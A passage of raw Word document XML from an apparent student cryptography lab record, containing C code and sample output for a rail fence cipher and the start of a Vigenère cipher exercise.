        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:sectPr w:rsidR="00090D7C">
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1060" w:right="1680" w:bottom="280" w:left="1140" w:header="0" w:footer="1185" w:gutter="0"/>
          <w:cols w:num="2" w:space="720" w:equalWidth="0">
            <w:col w:w="1183" w:space="335"/>
            <w:col w:w="7562"/>
          </w:cols>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l+</w:t>
      </w:r>
      <w:r>
        <w:t>+;</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60" w:right="7261"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>//</w:t>
      </w:r>
      <w:r>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>sp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ay</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>sec</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on for(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>=0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>;i</w:t>
      </w:r>
      <w:r>
        <w:t>&lt;k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>;i</w:t>
      </w:r>
      <w:r>
        <w:t>++)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="160"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="810" w:right="4933"/>
      </w:pPr>
      <w:r>
        <w:t>pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>f("</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>%</w:t>
      </w:r>
      <w:r>
        <w:t>c ",a[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>]</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">;   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="59"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>//</w:t>
      </w:r>
      <w:r>
        <w:t>Row 1 pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>t s[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>]=a[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>];</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>++;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="160"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="160"/>
      </w:pPr>
      <w:r>
        <w:t>pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>f("</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t>n"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="160"/>
      </w:pPr>
      <w:r>
        <w:t>for(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>=0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>;i</w:t>
      </w:r>
      <w:r>
        <w:t>&lt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i+</w:t>
      </w:r>
      <w:r>
        <w:t>+)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="160"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="810" w:right="4981"/>
      </w:pPr>
      <w:r>
        <w:t>pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>f("</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>%c",b[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">]);   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>//</w:t>
      </w:r>
      <w:r>
        <w:t>Row 2 pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt s[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>]=b[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>];</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>++;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="160"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="160"/>
      </w:pPr>
      <w:r>
        <w:t>pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>f("</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t>nCIPH</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>TE</w:t>
      </w:r>
      <w:r>
        <w:t>XT</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="59"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>%s",s);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="160"/>
      </w:pPr>
      <w:r>
        <w:t>ge</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>char(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pP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b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>O</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ut</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ut:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:hyperlink r:id="rId9">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rPr>
        <w:t>ra</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>il</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>fen</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>e.c</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:hyperlink r:id="rId1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a.out</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="2" w:line="540" w:lineRule="atLeast"/>
        <w:ind w:left="100" w:right="4741"/>
      </w:pPr>
      <w:r>
        <w:t>P</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>L</w:t>
      </w:r>
      <w:r>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>I</w:t>
      </w:r>
      <w:r>
        <w:t>N</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>TE</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>X</w:t>
      </w:r>
      <w:r>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-7"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>I</w:t>
      </w:r>
      <w:r>
        <w:t>NDIA</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>IS MY</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-9"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:t>OUN</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-14"/>
        </w:rPr>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:t>Y I D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-10"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-9"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>O N R</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="160"/>
      </w:pPr>
      <w:r>
        <w:t>N</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>I I M C U</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-15"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Y</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="480" w:lineRule="auto"/>
        <w:ind w:left="100" w:right="4739"/>
      </w:pPr>
      <w:r>
        <w:t>CI</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>P</w:t>
      </w:r>
      <w:r>
        <w:t>H</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>TE</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>X</w:t>
      </w:r>
      <w:r>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="59"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>I</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:t>AS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>Y</w:t>
      </w:r>
      <w:r>
        <w:t>ONRNI</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>I</w:t>
      </w:r>
      <w:r>
        <w:t>MCU</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>Y</w:t>
      </w:r>
      <w:hyperlink r:id="rId11">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before="6" w:line="280" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
        <w:sectPr w:rsidR="00090D7C">
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1060" w:right="1680" w:bottom="280" w:left="1140" w:header="720" w:footer="720"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812" w:right="715" w:hanging="3712"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Ex. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>N</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">o.: 3                                                                                                             </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="54"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">ate: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>V</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>I</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>G</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">NERE </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>I</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>PH</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ER</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5"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-15"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>V</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>g</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>ere C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>pher</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>ech</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>que 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t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>eng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he key from</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he 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2. Get</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>eng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ext</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>from</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>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3. Next</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>get</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he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s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
